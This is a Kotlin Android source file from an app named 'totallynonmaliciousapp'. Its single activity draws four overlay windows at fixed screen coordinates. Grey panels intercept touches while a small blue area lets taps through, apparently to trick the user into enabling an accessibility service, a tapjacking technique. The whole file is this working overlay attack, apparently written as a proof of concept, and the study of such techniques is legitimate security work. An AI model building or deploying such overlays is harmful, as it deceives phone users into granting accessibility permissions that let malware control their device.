package jamil.totallynonmaliciousapp

import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Bundle
import android.widget.Toast
import android.content.DialogInterface
import android.util.Log
import android.view.*
import android.widget.TextView


class EnableAccessibilityActivity  : Activity(){

    private var viewFullScreenGreyBottom : View? = null
    private var viewFullScreenGreyTop : View? = null
    private var viewFullScreenGreySide : View? = null
    private var viewFullScreenBlue : View? = null


    override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        Log.v("TotallyNonMaliciousApp", "dispatch");
        draw_window()

    }

    private fun draw_window() {
        val layoutInflator = getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater

        this.viewFullScreenGreyBottom = layoutInflator.inflate(R.layout.full_screen_grey_bottom, null)
        this.viewFullScreenGreyTop = layoutInflator.inflate(R.layout.full_screen_grey_top, null)
        this.viewFullScreenGreySide = layoutInflator.inflate(R.layout.full_screen_grey_center, null)
        this.viewFullScreenBlue = layoutInflator.inflate(R.layout.full_screen_blue, null)

        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val windowParametersTop = WindowManager.LayoutParams(
            1080,
            150,
            0,
            -1000,
            WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE  or WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        )

        val windowParametersBottom = WindowManager.LayoutParams(
            1080,
            1460,
            0,
            1000,
            WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )

        val windowParametersSide = WindowManager.LayoutParams(
            900,
            125,
            -90,
            -655,
            WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )

        val windowParametersBlue = WindowManager.LayoutParams(
            180,
            125,
            450,
            -655,
            WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        )

        windowManager.addView(viewFullScreenGreyTop, windowParametersTop)
        windowManager.addView(viewFullScreenGreyBottom, windowParametersBottom)
        windowManager.addView(viewFullScreenGreySide, windowParametersSide)
        windowManager.addView(viewFullScreenBlue, windowParametersBlue)
    }
}